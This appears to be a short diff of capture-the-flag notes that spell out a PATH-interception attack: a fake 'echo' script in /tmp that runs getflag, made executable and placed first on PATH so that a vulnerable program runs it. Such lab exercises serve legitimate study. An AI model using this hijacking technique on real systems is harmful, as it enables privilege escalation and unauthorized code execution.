@@ -1,0 +1,7 @@
+radare2 assembly
+echo exploit me
+Hijack Execution Flow: Path Interception by PATH Environment Variable
+cd /tmp
+echo getflag > echo
+chmod +x echo
+export PATH=/tmp:$PATH
